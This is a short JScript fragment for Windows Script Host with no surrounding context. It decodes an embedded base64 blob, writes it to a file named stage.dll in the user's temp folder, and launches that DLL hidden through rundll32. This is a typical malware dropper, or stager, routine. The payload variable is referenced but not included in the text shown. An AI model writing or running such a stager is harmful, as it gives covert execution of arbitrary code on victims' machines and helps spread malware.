function decode(s) {
var xml = new ActiveXObject("Msxml2.DOMDocument.6.0");
var node = xml.createElement("b64");
node.dataType = "bin.base64";
node.text = s;
return node.nodeTypedValue;
}
var shell = new ActiveXObject("WScript.Shell");
var outputFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\stage.dll";
if (ready) {
var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(decode(blob));
stream.SaveToFile(outputFile, 2);
stream.Close();
shell.Run('rundll32.exe "' + outputFile + '",Entry', 0, false);
}
